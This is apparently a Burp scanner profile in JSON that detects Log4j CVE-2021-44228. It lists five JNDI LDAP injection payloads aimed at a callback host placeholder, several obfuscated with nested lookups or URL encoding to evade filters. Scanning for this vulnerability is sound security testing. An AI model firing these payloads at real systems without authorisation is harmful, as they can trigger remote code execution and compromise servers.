[{"Name":"Log4j-Rce","Enabled":false,"Scanner":1,"Author":"@ytt","Payloads":["${jndi:ldap://{BC}}","${${evn:foo:-jndi}:ldap://{BC}}","${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//{BC}}","${${KYPUPd:fFxol:-j}${wDR:wrarX:-n}${VWNwsw:wdj:tRgYG:NQhEVz:-d}i:l${MCHG:DquQl:-d}a${rCw:amS:LOtea:Uty:Sxc:-p}://{BC}}","$%7b$%7bKYPUPd%3afFxol%3a-j%7d$%7bwDR%3awrarX%3a-n%7d$%7bVWNwsw%3awdj%3atRgYG%3aNQhEVz%3a-d%7di%3al$%7bMCHG%3aDquQl%3a-d%7da$%7brCw%3aamS%3aLOtea%3aUty%3aSxc%3a-p%7d%3a%2f%2f{BC}%7d"],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","Grep":[],"Tags":["All","RCE","CVE"],"PayloadResponse":false,"NotResponse":false,"TimeOut":"","isTime":false,"contentLength":"","iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"isurlextension":false,"NegativeUrlExtension":false,"MatchType":0,"RedirType":0,"MaxRedir":0,"payloadPosition":1,"payloadsFile":"","grepsFile":"","IssueName":"Log4j-RCE","IssueSeverity":"High","IssueConfidence":"Certain","IssueDetail":"CVE-2021-44228 \n\u003cbr\u003eLog4j 2.x \u003c 2.15.0 /\u003cbr\u003e\n\u003cpr\u003epayloads:   \u003cpayload\u003e","RemediationDetail":"","IssueBackground":"","RemediationBackground":"","Header":[],"VariationAttributes":[],"InsertionPointType":[18,65,32,36,7,1,2,6,33,5,35,34,64,0,3,4,37,127,65,32,36,7,1,2,6,33,5,35,34,64,0,3,4,37,127],"Scantype":0,"pathDiscovery":false}]